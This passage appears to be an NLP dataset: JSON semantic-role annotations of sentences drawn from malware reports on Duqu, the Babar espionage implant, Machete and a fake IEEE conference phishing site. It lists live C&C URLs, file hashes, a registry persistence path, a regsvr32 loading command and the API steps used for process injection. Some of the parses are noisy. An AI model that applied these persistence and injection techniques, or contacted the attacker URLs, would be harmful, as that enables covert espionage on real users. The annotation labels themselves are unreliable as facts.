"ARG1": {"text": "as HTTP or HTTPS servers"}}}, " Logging functions </heading>\n\nWe\u2019ve identified a characteristic logging function that is present in both Duqu and Duqu 2.0,\nand is used extensively in the networking (mainly HTTP handling) part of the code": {"\u2019ve": {"ARG0": {"text": "We"}, "V": {"text": "\u2019ve", "index": 3}}, "identified": {"ARGM-PRD": {"text": "Logging functions"}, "ARG0": {"text": "We \u2019ve"}, "V": {"text": "identified", "index": 4}, "ARG1": {"text": "a characteristic logging function that is present in both Duqu and Duqu 2.0"}}, "is": {"ARG1": {"text": "a characteristic logging function"}, "R-ARG1": {"text": "that"}, "V": {"text": "is", "index": 10}, "ARG2": {"text": "present in both Duqu and Duqu 2.0"}}, "is_2": {"V": {"text": "is", "index": 20}}, "used": {"ARG1": {"text": "Logging functions We \u2019ve"}, "V": {"text": "used", "index": 21}, "ARGM-EXT": {"text": "extensively"}, "ARGM-LOC": {"text": "in the networking ( mainly HTTP handling ) part of the code"}}}, " It is most likely that one or more\ninfected computers can be proxy points towards the attacker, meaning that other infected\ncomputers communicate with these proxies": {"is": {"V": {"text": "is", "index": 1}, "ARG2": {"text": "most likely"}, "ARG1": {"text": "that one or more infected computers can be proxy points towards the attacker , meaning that other infected computers communicate with these proxies"}}, "can": {"V": {"text": "can", "index": 10}}, "be": {"ARG1": {"text": "one or more infected computers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "be", "index": 11}, "ARG2": {"text": "proxy points towards the attacker"}}, "meaning": {"V": {"text": "meaning", "index": 18}, "ARG1": {"text": "that other infected computers communicate with these proxies"}}, "communicate": {"ARG0": {"text": "other infected computers"}, "V": {"text": "communicate", "index": 23}, "ARG2": {"text": "with these proxies"}}}, "\n\n \n<heading> 3.2 BABAR CAME TO STAY </heading>\n\nThe startup routine of the Babar implant will create a registry key under\n'[HKU]\\..\\CurrentVersion\\Run' to assure persistence": {"will": {"V": {"text": "will", "index": 7}}, "create": {"ARG0": {"text": "The startup routine of the Babar implant"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "create", "index": 8}, "ARG1": {"text": "a registry key under ' [ HKU]\\ .. \\CurrentVersion\\Run ' to assure persistence"}}, "assure": {"V": {"text": "assure", "index": 20}, "ARG2": {"text": "persistence"}}}, "\n\nApart from that, Babar comes with a userland rootkit component which applies global Windows\nhooks to invade all processes on its desktop": {"comes": {"ARGM-ADV": {"text": "Apart from that"}, "ARG1": {"text": "Babar"}, "V": {"text": "comes", "index": 5}, "ARGM-MNR": {"text": "with a userland rootkit component which applies global Windows hooks to"}, "ARG2": {"text": "invade all processes on its desktop"}}, "applies": {"ARG1": {"text": "a userland rootkit component"}, "R-ARG1": {"text": "which"}, "V": {"text": "applies", "index": 12}, "ARG2": {"text": "global Windows hooks to invade all processes on its desktop"}}, "invade": {"V": {"text": "invade", "index": 17}, "ARG1": {"text": "all processes on its desktop"}}}, " MISCREANT'S IMPLANT </heading>\n\nBabar's implant is a 32-bit DLL written in C++, which upon start injects itself to running processes\nand invades desktop applications by applying a global Windows hooks": {"is": {"ARG1": {"text": "MISCREANT 'S IMPLANT Babar 's implant"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "a 32-bit DLL written in C++ , which upon start injects itself to running processes and invades desktop applications by applying a global Windows hooks"}}, "written": {"ARG1": {"text": "a 32-bit DLL"}, "V": {"text": "written", "index": 10}, "ARGM-MNR": {"text": "in C++"}}, "injects": {"ARG0": {"text": "a 32-bit DLL written in C++"}, "R-ARG0": {"text": "which"}, "V": {"text": "injects", "index": 17}, "ARG1": {"text": "itself"}, "ARGM-PRP": {"text": "to running processes"}}, "invades": {"R-ARG0": {"text": "which"}, "V": {"text": "invades", "index": 23}, "ARG1": {"text": "desktop applications"}, "ARGM-MNR": {"text": "by applying a global Windows hooks"}}, "applying": {"V": {"text": "applying", "index": 27}, "ARG1": {"text": "a global Windows hooks"}}}, " As opposed to\npersistence, Babar also implements functionality to uninstall itself from the affected system": {"opposed": {"V": {"text": "opposed", "index": 1}, "ARG1": {"text": "to persistence"}}, "implements": {"ARGM-ADV": {"text": "As opposed to persistence"}, "ARG0": {"text": "Babar"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "implements", "index": 7}, "ARG1": {"text": "functionality to uninstall itself from the affected system"}}, "uninstall": {"ARG0": {"text": "Babar"}, "V": {"text": "uninstall", "index": 10}, "ARG1": {"text": "itself"}, "ARG2": {"text": "from the affected system"}}}, " The predefined groups of\napplication names retrieved from the hardcoded configuration data set the scope of Babar's\nhooking advances:\n\n<list>\n   \u2022   Internet communication\n       iexplore.exe,firefox.exe,opera.exe,chrome.exe,Safari.exe,msnmsgr.exe\n\n   \u2022   File creation\n       excel.exe, winword.exe, powerpnt.exe, visio.exe, acrord32.exe, notepad.exe,\n       wordpad.exe.txt, rtf, xls, xlsx, ppt, pptx, doc, docx, pdf, vsd\n\n   \u2022   Media\n       skype.exe, msnmsgr.exe, oovoo.exe, nimbuzz.exe, googletalk.exe, yahoomessenger.exe, x-\n       lite.exe\n</list>\n\nThe respective trampolines steal data going in or out of the hooked APIs on the fly": {"retrieved": {"ARG1": {"text": "The predefined groups of application names"}, "V": {"text": "retrieved", "index": 6}, "ARG2": {"text": "from the hardcoded configuration data"}}, "set": {"ARG0": {"text": "The predefined groups of application names retrieved from the hardcoded configuration data"}, "V": {"text": "set", "index": 12}, "ARG1": {"text": "the scope of Babar 's hooking advances"}}, "advances": {"ARG0": {"text": "Babar 's"}, "ARGM-ADJ": {"text": "hooking"}, "V": {"text": "advances", "index": 19}}, "steal": {"ARG0": {"text": "The respective"}, "V": {"text": "steal", "index": 24}, "ARG1": {"text": "data"}, "ARGM-MNR": {"text": "going in or out"}, "ARGM-CAU": {"text": "of the hooked APIs"}, "ARGM-TMP": {"text": "on the fly"}}, "going": {"ARG1": {"text": "steal data"}, "V": {"text": "going", "index": 26}, "ARGM-DIR": {"text": "in"}, "ARG3": {"text": "out of the"}}}, " MISCREANT'S DROPPER </heading>\n\nThe dropper operates straight forward; it fetches the encrypted DLL from its own binary from\noutside its resource section, decrypts it and hides it in the file system": {"operates": {"ARG1": {"text": "MISCREANT 'S DROPPER The dropper"}, "V": {"text": "operates", "index": 5}, "ARGM-DIR": {"text": "straight forward"}}, "fetches": {"ARG0": {"text": "it"}, "V": {"text": "fetches", "index": 10}, "ARG1": {"text": "the encrypted DLL"}, "ARGM-DIR": {"text": "from its own binary/ from outside its resource section"}}, "encrypted": {"V": {"text": "encrypted", "index": 12}, "ARG1": {"text": "DLL"}}, "decrypts": {"ARG0": {"text": "it"}, "V": {"text": "decrypts", "index": 24}, "ARG1": {"text": "it"}}, "hides": {"ARG0": {"text": "it"}, "V": {"text": "hides", "index": 27}, "ARG1": {"text": "it"}, "ARGM-LOC": {"text": "in the file system"}}}, "\n\nA global Windows hook is installed into the Windows event chain": {"is": {"V": {"text": "is", "index": 4}}, "installed": {"ARG1": {"text": "A global Windows hook"}, "V": {"text": "installed", "index": 5}, "ARG2": {"text": "into the Windows event chain"}}}, "\n\n\n<heading> 3.5.2 INVADING DESKTOP PROCESSES </heading>\n\nThe Babar implant applies global Windows hooks to load its DLL into the process space of other\nprocesses": {"applies": {"ARG0": {"text": "The Babar implant"}, "V": {"text": "applies", "index": 3}, "ARG1": {"text": "global Windows hooks"}, "ARG2": {"text": "to load its DLL into the process space of other processes"}}, "load": {"V": {"text": "load", "index": 8}, "ARG2": {"text": "its DLL/ into the process space of other processes"}}}, " The analyzed malware consists of a dropper and an\nimplant, which invades Windows processes to steal data from instant messengers, softphones,\nbrowsers and office applications": {"consists": {"ARG1": {"text": "The analyzed malware"}, "V": {"text": "consists", "index": 3}, "ARG2": {"text": "of a dropper and an implant , which invades Windows processes to steal data from instant messengers , softphones , browsers and office applications"}}, "invades": {"ARG0": {"text": "an implant"}, "R-ARG0": {"text": "which"}, "V": {"text": "invades", "index": 12}, "ARG1": {"text": "Windows processes to steal data from instant messengers , softphones , browsers and office applications"}}, "processes": {"ARG1": {"text": "Windows"}, "V": {"text": "processes", "index": 14}}, "steal": {"V": {"text": "steal", "index": 16}, "ARG1": {"text": "data"}, "ARG2": {"text": "from instant messengers , softphones , browsers and office applications"}}}, "\n\nFor grabbing audio streams Babar includes code\nfrom the OpenCORE AMR library [8]": {"grabbing": {"V": {"text": "grabbing", "index": 1}, "ARG1": {"text": "audio streams Babar"}}, "includes": {"ARG2": {"text": "For grabbing audio streams Babar"}, "V": {"text": "includes", "index": 5}, "ARG1": {"text": "code/ [ 8 ]"}, "ARGM-ADV": {"text": "from the OpenCORE AMR library"}}}, " This way Babar can install API hooks for various APIs\nvia Windows Detours technique to actively steal data from arbitrary processes": {"can": {"ARG0": {"text": "This way Babar"}, "V": {"text": "can", "index": 3}, "ARG1": {"text": "install API hooks for various APIs/ to actively steal data from arbitrary processes"}, "ARGM-MNR": {"text": "via Windows Detours technique"}}, "install": {"ARG0": {"text": "This way Babar"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "install", "index": 4}, "ARG1": {"text": "API hooks"}, "ARGM-PRP": {"text": "for various APIs/ to actively steal data from arbitrary processes"}, "ARGM-MNR": {"text": "via Windows Detours technique"}}, "steal": {"ARG0": {"text": "This way Babar"}, "ARGM-MNR": {"text": "actively"}, "V": {"text": "steal", "index": 16}, "ARG1": {"text": "data"}, "ARG2": {"text": "from arbitrary processes"}}}, "\n\n\n\n\n                                                                                              <footer>  page | 9 </footer>\n\n<figure></figure> <caption> \f                         Illustration 3 | Named pipes opened by the main instance </caption>\n\n\n\n\n<heading> 3.5 FUNCTIONALITY </heading>\n\nThe spying activities are performed either through the Babar instance locally or via a global\nWindows hook invading all processes running in the same desktop": {"are": {"V": {"text": "are", "index": 3}}, "performed": {"ARG1": {"text": "The spying activities"}, "V": {"text": "performed", "index": 4}, "ARGM-MNR": {"text": "either through the Babar instance locally or via a global Windows hook invading all processes running in the same desktop"}}, "hook": {"ARG1": {"text": "Windows"}, "V": {"text": "hook", "index": 16}}, "invading": {"ARG0": {"text": "a global Windows hook"}, "V": {"text": "invading", "index": 17}, "ARG1": {"text": "all processes running in the same desktop"}}, "running": {"ARG1": {"text": "all processes"}, "V": {"text": "running", "index": 20}, "ARGM-MNR": {"text": "in the same desktop"}}}, " The implant is capable of\nlogging keystrokes, capture screen shots, spy on installed softphones and instant messengers next\nto a list of simpler espionage tricks": {"is": {"ARG1": {"text": "The implant"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "capable of logging keystrokes , capture screen shots , spy on installed softphones and instant messengers next to a list of simpler espionage tricks"}}, "logging": {"V": {"text": "logging", "index": 5}, "ARG1": {"text": "keystrokes"}}, "installed": {"V": {"text": "installed", "index": 14}, "ARG1": {"text": "softphones and instant messengers"}, "ARG2": {"text": "to a list of simpler espionage tricks"}}}, "\n\nThe analyzed sample of Babar has two hard coded C&C server addresses which are included in its\nconfiguration data:\n\n<list>\n   \u2022   http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php\n   \u2022   http://www.gezelimmi.com/wp-includes/misc/bb/index.php\n</list>\n\nBoth servers were used to push spied information onto the remote site": {"has": {"ARG0": {"text": "The analyzed sample of Babar"}, "V": {"text": "has", "index": 5}, "ARG1": {"text": "two hard coded C&C server addresses which are included in its configuration data"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 8}, "ARG1": {"text": "C&C server addresses"}}, "are": {"V": {"text": "are", "index": 13}}, "included": {"ARG1": {"text": "two hard coded C&C server addresses"}, "R-ARG1": {"text": "which"}, "V": {"text": "included", "index": 14}, "ARG2": {"text": "in its configuration data"}}, "were": {"V": {"text": "were", "index": 22}}, "used": {"ARG1": {"text": "Both servers"}, "V": {"text": "used", "index": 23}, "ARG2": {"text": "to push spied information onto the remote site"}}, "push": {"V": {"text": "push", "index": 25}, "ARG1": {"text": "spied information"}, "ARG2": {"text": "onto the remote site"}}}, "\n\n\n\n\n                                                                                          <footer>  page | 10 </footer>\n<figure></figure> <caption> \f               Illustration 4 | The keylogger module uses Windows RAWINPUT to achieve its goal </caption>\n\n\nThe snooped keystroke data is passed to a thread, which performs encryption and dumps the data\nto a log file": {"is": {"V": {"text": "is", "index": 4}}, "passed": {"ARG1": {"text": "The snooped keystroke data"}, "V": {"text": "passed", "index": 5}, "ARG2": {"text": "to a thread , which performs encryption and dumps the data to a log file"}}, "performs": {"ARG0": {"text": "a thread"}, "R-ARG0": {"text": "which"}, "V": {"text": "performs", "index": 11}, "ARG1": {"text": "encryption"}}, "dumps": {"ARG0": {"text": "a thread"}, "R-ARG0": {"text": "which"}, "V": {"text": "dumps", "index": 14}, "ARG1": {"text": "the data"}, "ARGM-GOL": {"text": "to a log file"}}}, "\n\n<list>\n4db3801a45802041baa44334303e0498c2640cd5dfd6892545487bf7c8c9219f                      ThreatFire\n522e5549af01c747329d923110c058b7bb7e112816de64bd7919d7b9194fba5b                      Rising\n2fd5c42d49f9e0fe2daae5b0f78cf9cfde9bfc7b0ed59fc68e0a79a3b16fe05b\n06e387bb79584cdff3672feadea0bf6f783ce1ddc1fa91962d1b5bcd94e1a308\nf1761a5e3856dceb3e14d4555af92d3d1ac47604841f69fc72328b53ab45ca56                      Kaspersky\n588730213eb6ace35caadcb651217bfbde3f615d94a9cca41a31ee9fa09b186c                      ZoneAlarm\nc8e8248940830e9f1dc600c189640e91c40f95caae4f3187fb04427980cdc479\nb3fe0e3a3e3befa152c4237b0f3a96ffaa44a2d7e1aa6d379d3a1ab4659e1676                      AntiVir\n</list>\n\nBabar also implements an obfuscation technique to hide certain API names": {"implements": {"ARG0": {"text": "Babar"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "implements", "index": 2}, "ARG1": {"text": "an obfuscation technique to hide certain API names"}}, "hide": {"ARG0": {"text": "an obfuscation"}, "V": {"text": "hide", "index": 7}, "ARG1": {"text": "certain API names"}}}, " The\nimplant is able to hook APIs of interest in dedicated remote processes, to steal data on the fly": {"is": {"ARG1": {"text": "The implant"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "able to hook APIs of interest in dedicated remote processes , to steal data on the fly"}}, "hook": {"ARG0": {"text": "The implant"}, "V": {"text": "hook", "index": 5}, "ARG1": {"text": "APIs of interest in dedicated remote processes"}, "ARG2": {"text": "to steal data on the fly"}}, "steal": {"ARG0": {"text": "The implant"}, "V": {"text": "steal", "index": 15}, "ARG1": {"text": "data"}, "ARGM-MNR": {"text": "on the fly"}}}, " At the same time, the main instance\ncreates six named pipes using the very same GUID": {"creates": {"ARGM-TMP": {"text": "At the same time"}, "ARG0": {"text": "the main instance"}, "V": {"text": "creates", "index": 8}, "ARG1": {"text": "six named pipes"}, "ARGM-MNR": {"text": "using the very same GUID"}}, "named": {"V": {"text": "named", "index": 10}, "ARG2": {"text": "pipes"}}, "using": {"ARG0": {"text": "six named pipes"}, "V": {"text": "using", "index": 12}, "ARG1": {"text": "the very same GUID"}}}, " Instance-local capabilities are\nbasic spying on window names or snooping on the clipboard data, while the global hooks manage\nto steal information directly from Windows API calls": {"are": {"ARGM-DIS": {"text": "Instance"}, "ARG1": {"text": "local capabilities"}, "V": {"text": "are", "index": 4}, "ARG2": {"text": "basic spying on window names or snooping on the clipboard data"}, "ARGM-ADV": {"text": "while the global hooks manage to steal information directly from Windows API calls"}}, "spying": {"ARG0": {"text": "local capabilities"}, "V": {"text": "spying", "index": 6}, "ARGM-LOC": {"text": "on"}, "ARGM-ADV": {"text": "window names"}}, "snooping": {"V": {"text": "snooping", "index": 11}, "ARG2": {"text": "on the clipboard data"}}, "manage": {"ARG0": {"text": "the global hooks"}, "V": {"text": "manage", "index": 21}, "ARG1": {"text": "to steal information directly from Windows API calls"}}, "steal": {"ARG0": {"text": "the global hooks"}, "V": {"text": "steal", "index": 23}, "ARG1": {"text": "information"}, "ARGM-MNR": {"text": "directly"}, "ARG2": {"text": "from Windows API calls"}}, "calls": {"ARG0": {"text": "the global hooks/ Windows API"}, "V": {"text": "calls", "index": 29}}}, " Then it goes on to load the\nDLL using Windows regsvr32.exe": {"goes": {"ARGM-DIS": {"text": "Then"}, "ARG1": {"text": "it"}, "V": {"text": "goes", "index": 2}, "ARGM-PRP": {"text": "to load the DLL"}, "ARGM-MNR": {"text": "using Windows regsvr32.exe"}}, "load": {"ARG0": {"text": "it"}, "V": {"text": "load", "index": 5}, "ARG2": {"text": "the DLL"}, "ARGM-MNR": {"text": "using Windows regsvr32.exe"}}, "using": {"ARG0": {"text": "it"}, "V": {"text": "using", "index": 8}, "ARG1": {"text": "Windows regsvr32.exe"}}}, " This\nway the malware reduces forensic artefacts, staying behind after infection": {"reduces": {"ARGM-MNR": {"text": "This way"}, "ARG0": {"text": "the malware"}, "V": {"text": "reduces", "index": 4}, "ARG1": {"text": "forensic artefacts/ staying behind after infection"}}, "staying": {"ARG1": {"text": "the malware"}, "V": {"text": "staying", "index": 8}, "ARG3": {"text": "behind"}, "ARGM-TMP": {"text": "after infection"}}}, " At system boot time the regsvr32.exe process will start, load the\nBabar DLL and thus 'deploy' the malware to various legitimate processes": {"will": {"V": {"text": "will", "index": 7}}, "start": {"ARGM-TMP": {"text": "At system boot time"}, "ARG1": {"text": "the regsvr32.exe process"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "start", "index": 8}}, "load": {"ARGM-TMP": {"text": "At system boot time"}, "ARG0": {"text": "the regsvr32.exe process"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "load", "index": 10}, "ARG2": {"text": "the Babar DLL"}}, "deploy": {"ARGM-DIS": {"text": "thus"}, "V": {"text": "deploy", "index": 17}, "ARG1": {"text": "the malware to various legitimate processes"}}}, " The steps being taken are:\n\n<list>\n   \u2022   MapViewOfFile \u2013 mapped memory shared with the child instance\n   \u2022   OpenProcess \u2013 obtaining a handle to the chosen victim process\n   \u2022   VirtualAllocEx \u2013 allocate space in remote memory\n   \u2022   WriteProcessMemory \u2013 write function stub to remote memory\n   \u2022   CreateRemoteThread \u2013 execute function stub as remote process\n</list>\n\nThe function stub will then go on to load the Babar DLL through LoadLibraryA and execute one of\nits exports, as indicated in the shared memory": {"being": {"V": {"text": "being", "index": 2}}, "taken": {"ARG1": {"text": "The steps"}, "V": {"text": "taken", "index": 3}}, "are": {"ARG1": {"text": "The steps being taken"}, "V": {"text": "are", "index": 4}, "ARG2": {"text": "The function stub will then go on to load the Babar DLL through LoadLibraryA and execute one of its exports , as indicated in the shared memory"}}, "will": {"V": {"text": "will", "index": 9}}, "go": {"ARG1": {"text": "The function stub"}, "ARGM-MOD": {"text": "will"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "go", "index": 11}, "ARGM-PRP": {"text": "to load the Babar DLL through LoadLibraryA"}, "ARGM-PRD": {"text": "as indicated in the shared memory"}}, "load": {"ARG0": {"text": "The function stub"}, "V": {"text": "load", "index": 14}, "ARG2": {"text": "the Babar DLL"}, "ARGM-MNR": {"text": "through LoadLibraryA"}}, "execute": {"ARG0": {"text": "The function stub"}, "V": {"text": "execute", "index": 21}, "ARG1": {"text": "one of its exports"}, "ARGM-ADV": {"text": "as indicated in the shared memory"}}, "indicated": {"V": {"text": "indicated", "index": 28}, "ARGM-LOC": {"text": "in the shared memory"}}}, "\n\nAfter infection the dropper executes a separate command line through spawning a cmd.exe\nprocess, which is instructed to wait for 1 second before deleting the dropper binary on disk": {"executes": {"ARGM-TMP": {"text": "After infection"}, "ARG0": {"text": "the dropper"}, "V": {"text": "executes", "index": 4}, "ARG1": {"text": "a separate command line"}, "ARGM-MNR": {"text": "through spawning a cmd.exe process , which is instructed to wait for 1 second before deleting the dropper binary on disk"}}, "spawning": {"V": {"text": "spawning", "index": 10}, "ARG1": {"text": "a cmd.exe process"}}, "is": {"V": {"text": "is", "index": 16}}, "instructed": {"ARG1": {"text": "a separate command line through spawning a cmd.exe process"}, "R-ARG1": {"text": "which"}, "V": {"text": "instructed", "index": 17}, "ARG2": {"text": "to wait for 1 second before deleting the dropper binary on disk"}}, "wait": {"ARG1": {"text": "which"}, "V": {"text": "wait", "index": 19}, "ARGM-TMP": {"text": "for 1 second before deleting the dropper binary on disk"}}, "deleting": {"V": {"text": "deleting", "index": 24}, "ARG1": {"text": "the dropper binary"}, "ARG2": {"text": "on disk"}}}, " The malware creates an invisible window, with no\nother purpose than to receive window messages": {"creates": {"ARG0": {"text": "The malware"}, "V": {"text": "creates", "index": 2}, "ARG1": {"text": "an invisible window"}, "ARGM-PRD": {"text": "with no other purpose than to receive window messages"}}, "receive": {"V": {"text": "receive", "index": 13}, "ARG1": {"text": "window messages"}}}, "\n\nFor inter process communication Babar uses named pipes": {"uses": {"ARG2": {"text": "For inter"}, "ARG1": {"text": "process communication Babar/ named pipes"}, "V": {"text": "uses", "index": 5}}, "named": {"ARGM-ADV": {"text": "For inter"}, "ARG1": {"text": "communication Babar uses"}, "V": {"text": "named", "index": 6}, "ARG2": {"text": "pipes"}}}, " Once in\nthe context of a desired target process, the malware goes on to hook specific APIs of interest": {"desired": {"V": {"text": "desired", "index": 6}, "ARG1": {"text": "target process"}}, "goes": {"ARGM-TMP": {"text": "Once in"}, "ARGM-MNR": {"text": "the context of a desired target process"}, "ARG1": {"text": "the malware"}, "V": {"text": "goes", "index": 12}, "ARGM-PRP": {"text": "to hook specific APIs of interest"}}, "hook": {"ARG0": {"text": "the malware"}, "V": {"text": "hook", "index": 15}, "ARG1": {"text": "specific APIs of interest"}}}, " Babar is able to sniff all keystrokes\nhappening on the same desktop as its invisible window": {"is": {"ARG1": {"text": "Babar"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "able to sniff all keystrokes happening on the same desktop as its invisible window"}}, "sniff": {"ARG0": {"text": "Babar"}, "V": {"text": "sniff", "index": 4}, "ARG1": {"text": "all keystrokes happening on the same desktop as its invisible window"}}, "happening": {"ARG1": {"text": "all keystrokes"}, "V": {"text": "happening", "index": 7}, "ARGM-LOC": {"text": "on the same desktop as its invisible window"}}}, " Babar operates through multiple instances, by\ninjecting its DLL to a maximum of three desktop processes": {"operates": {"ARG1": {"text": "Babar"}, "V": {"text": "operates", "index": 1}, "ARGM-MNR": {"text": "through multiple instances , by injecting its DLL to a maximum of three desktop processes"}}, "injecting": {"ARG0": {"text": "Babar"}, "V": {"text": "injecting", "index": 7}, "ARG1": {"text": "its DLL"}, "ARG2": {"text": "to a maximum of three desktop processes"}}}, " To achieve this it spawns a dedicated process with the command\nline '\"regsvr32.exe\" /s /n /i \"%APPDATA%\\%DLLNAME%\"'": {"achieve": {"V": {"text": "achieve", "index": 1}, "ARG1": {"text": "this"}}, "spawns": {"R-ARG0": {"text": "To achieve this"}, "ARG0": {"text": "it"}, "V": {"text": "spawns", "index": 4}, "ARG1": {"text": "a dedicated process with the command line ' \" regsvr32.exe \" /s /n /i \" % APPDATA%\\%DLLNAME% \""}}}, "\n\n\n                                                                                         <footer>    page | 12 </footer>\n\fThe data, like all stolen information, is handled by\na separate thread which compresses and encrypts\nit before dumping it to a file on disk": {"stolen": {"V": {"text": "stolen", "index": 5}, "ARG1": {"text": "information"}}, "is": {"V": {"text": "is", "index": 8}}, "handled": {"ARG1": {"text": "The data/ like all stolen information"}, "V": {"text": "handled", "index": 9}, "ARG0": {"text": "by a separate thread which compresses and encrypts it before dumping it to a file on disk"}}, "compresses": {"ARG0": {"text": "a separate thread"}, "R-ARG0": {"text": "which"}, "V": {"text": "compresses", "index": 15}, "ARG1": {"text": "it"}, "ARGM-TMP": {"text": "before dumping it to a file on disk"}}, "encrypts": {"ARG0": {"text": "a separate thread"}, "R-ARG0": {"text": "which"}, "V": {"text": "encrypts", "index": 17}, "ARG1": {"text": "it"}, "ARGM-TMP": {"text": "before dumping it to a file on disk"}}, "dumping": {"ARG0": {"text": "The"}, "V": {"text": "dumping", "index": 20}, "ARG1": {"text": "it"}, "ARG2": {"text": "to a file on disk"}}}, "\n\nDuring this investigation, we also discovered many other the files installing this cyber-espionage tool in\nwhat appears to be a dedicated a spear phishing campaign": {"discovered": {"ARGM-TMP": {"text": "During this investigation"}, "ARG0": {"text": "we"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "discovered", "index": 6}, "ARG1": {"text": "many other the files installing this cyber - espionage tool in what appears to be a dedicated a spear phishing campaign"}}, "installing": {"ARG0": {"text": "many other the files"}, "V": {"text": "installing", "index": 11}, "ARG1": {"text": "this cyber - espionage tool in what appears to be a dedicated a spear phishing campaign"}}, "appears": {"V": {"text": "appears", "index": 19}, "ARG1": {"text": "to be a dedicated a spear phishing campaign"}}, "be": {"ARG1": {"text": "what"}, "V": {"text": "be", "index": 21}, "ARG2": {"text": "a dedicated a spear phishing campaign"}}, "phishing": {"V": {"text": "phishing", "index": 26}, "ARG0": {"text": "campaign"}}}, "\n</section>\n\f\n<section>\n<heading>How does \"Machete\" operate?</heading>\n\nThe malware is distributed via social engineering techniques, which includes spear-phishing emails and\ninfections via Web by a fake Blog website": {"is": {"V": {"text": "is", "index": 2}}, "distributed": {"ARG1": {"text": "The malware"}, "V": {"text": "distributed", "index": 3}, "ARGM-MNR": {"text": "via social engineering techniques , which includes spear - phishing emails and infections via Web by a fake Blog website"}}, "includes": {"ARG2": {"text": "social engineering techniques"}, "R-ARG2": {"text": "which"}, "V": {"text": "includes", "index": 10}, "ARG1": {"text": "spear - phishing emails and infections via Web by a fake Blog website"}}, "phishing": {"ARGM-MNR": {"text": "spear"}, "V": {"text": "phishing", "index": 13}, "ARG1": {"text": "emails"}}}, "\n\nThe malware is capable of the following cyber-espionage operations:\n\n<list>\n      Logging keystrokes\n      Capturing audio from the computer's microphone\n      Capturing screenshots\n      Capturing geolocation data\n      Taking photos from the computer's web camera\n      Copying files to a remote server\n      Copying files to a special USB device if inserted\n      Hijjacking the clipboard and capturing information from the target machine\n</list>\n</section>\n\n<section>\n<heading>Targets of \"Machete\"</heading>\n\f\n\n<figure></figure>\n\nMost of the victims are located in, Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, among\nothers": {"is": {"ARG1": {"text": "The malware"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "capable of the following cyber - espionage operations"}}, "following": {"V": {"text": "following", "index": 6}, "ARG1": {"text": "cyber - espionage operations"}}, "are": {"V": {"text": "are", "index": 16}}, "located": {"ARG1": {"text": "Most of the victims"}, "V": {"text": "located", "index": 17}, "ARGM-LOC": {"text": "in , Venezuela , Ecuador , Colombia , Peru , Russia , Cuba , and Spain ,/ among others"}}}, "\nThey deliver this malware as a malicious executable          \n(dropper)": {"deliver": {"ARG0": {"text": "They"}, "V": {"text": "deliver", "index": 1}, "ARG1": {"text": "this malware"}, "ARG2": {"text": "as a malicious executable ( dropper )"}}}, " The\nattackers tailored these login pages for specific                           \ntargets in the DIB and spoofed a variety of services                        \nsuch as Outlook Web Access and VPN login pages": {"tailored": {"ARG0": {"text": "The attackers"}, "V": {"text": "tailored", "index": 2}, "ARG1": {"text": "these login pages"}, "ARG2": {"text": "for specific targets in the DIB"}}, "spoofed": {"ARG0": {"text": "The attackers tailored"}, "V": {"text": "spoofed", "index": 13}, "ARG1": {"text": "a variety of services such as Outlook Web Access and VPN login pages"}}}, " The attackers\nregistered the domain \u201caeroconf2014[.]org\u201d in\norder to impersonate the IEEE Aerospace\nconference\u2014the conference\u2019s actual domain is\naeroconf.org\u2014and sent out an email with the\nfollowing information:\n<list>\nFrom: invite@aeroconf2014[.]org\nSubject: IEEE Aerospace Conference 2014\n</list>\nThe email encouraged users to visit a fake\nconference website owned by the attackers:\n\nUpon visiting the website, visitors were notified\nthat they must install \u201cproxy\u201d software in order to\naccess it, which is actually malware": {"registered": {"ARG0": {"text": "The attackers"}, "V": {"text": "registered", "index": 2}, "ARG1": {"text": "the domain"}, "ARG3": {"text": "\u201c aeroconf2014[.]org \u201d"}, "ARGM-PRP": {"text": "in order to impersonate the IEEE Aerospace conference \u2014 the conference \u2019s actual domain"}}, "impersonate": {"V": {"text": "impersonate", "index": 11}, "ARG1": {"text": "the IEEE Aerospace conference \u2014 the conference \u2019s actual domain"}}, "is": {"ARG1": {"text": "actual domain"}, "V": {"text": "is", "index": 22}, "ARG2": {"text": "aeroconf.org\u2014and sent out an email with the following information"}}, "sent": {"ARG0": {"text": "aeroconf.org\u2014and"}, "V": {"text": "sent", "index": 24}, "ARG1": {"text": "an email"}, "ARGM-MNR": {"text": "with the following information"}}, "following": {"V": {"text": "following", "index": 30}, "ARG1": {"text": "information"}}, "encouraged": {"ARG0": {"text": "The email"}, "V": {"text": "encouraged", "index": 35}, "ARG1": {"text": "users"}, "ARG2": {"text": "to visit a fake conference website owned by the attackers"}}, "visit": {"ARG0": {"text": "users"}, "V": {"text": "visit", "index": 38}, "ARG1": {"text": "a fake conference website owned by the attackers"}}, "owned": {"ARG1": {"text": "a fake conference website"}, "V": {"text": "owned", "index": 43}, "ARG0": {"text": "by the attackers"}}, "visiting": {"V": {"text": "visiting", "index": 49}, "ARG1": {"text": "the website"}}, "were": {"V": {"text": "were", "index": 54}}, "notified": {"ARGM-PRD": {"text": "Upon visiting the website"}, "ARG1": {"text": "visitors"}, "V": {"text": "notified", "index": 55}, "ARG2": {"text": "that they must install \u201c proxy \u201d software in order to access it , which is actually malware"}}, "must": {"ARG0": {"text": "they"}, "V": {"text": "must", "index": 58}, "ARG1": {"text": "install \u201c proxy \u201d software"}, "ARGM-PRP": {"text": "in order to access it ,/ which is actually malware"}}, "install": {"ARG0": {"text": "they"}, "ARGM-MOD": {"text": "must"}, "V": {"text": "install", "index": 59}, "ARG1": {"text": "\u201c proxy \u201d software"}, "ARGM-PRP": {"text": "in order to access it , which is actually malware"}}, "access": {"V": {"text": "access", "index": 67}, "ARG1": {"text": "it"}}, "is_2": {"ARG1": {"text": "which"}, "V": 